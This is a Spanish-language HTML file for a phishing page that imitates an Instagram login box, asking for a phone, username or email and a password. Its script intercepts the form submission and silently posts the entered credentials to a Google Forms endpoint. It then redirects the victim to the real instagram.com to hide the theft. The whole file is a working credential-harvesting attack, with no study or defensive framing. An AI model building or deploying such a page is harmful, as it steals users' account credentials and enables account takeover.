<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulario sin redirección</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #fafafa;
    }

    .login-box {
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
      text-align: center;
      width: 300px;
    }

    input {
      display: block;
      width: 100%;
      margin: 10px 0;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
    }

    .password-container {
      position: relative;
      width: 100%;
    }

    .password-container input {
      width: 100%;
      padding-right: 60px;
    }

    .toggle-password {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #0095f6;
      font-size: 14px;
      cursor: pointer;
      padding: 5px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }

    button:hover {
      background-color: #007acc;
    }
  </style>
</head>
<body>

<div class="login-box">
  <form id="myForm">
    <input type="text" name="entry.1271603301" placeholder="Teléfono, usuario o correo electrónico" required>
    
    <div class="password-container">
      <input type="password" id="password" name="entry.1257754249" placeholder="Contraseña" required>
      <button type="button" class="toggle-password" onclick="togglePassword()">Mostrar</button>
    </div>

    <button type="submit">Iniciar sesión</button>
  </form>
</div>

<script>
  function togglePassword() {
    const passwordInput = document.getElementById("password");
    const toggleButton = document.querySelector(".toggle-password");
    
    if (passwordInput.type === "password") {
      passwordInput.type = "text";
      toggleButton.textContent = "Ocultar";
    } else {
      passwordInput.type = "password";
      toggleButton.textContent = "Mostrar";
    }
  }

  document.getElementById("myForm").addEventListener("submit", function(event) {
    event.preventDefault();
    const form = new FormData(this);
    fetch("https://docs.google.com/forms/d/e/1FAIpQLScixbdWi6SxI01JD38odY0Vr0p0ShZB4P51zkqwcBNwFIHjxw/formResponse", {
      method: "POST",
      body: form,
      mode: "no-cors"
    }).then(() => {
      // Redirecciona inmediatamente sin demora
      window.location.href = "https://www.instagram.com";
    });
    this.reset();
  });
</script>

</body>
</html>
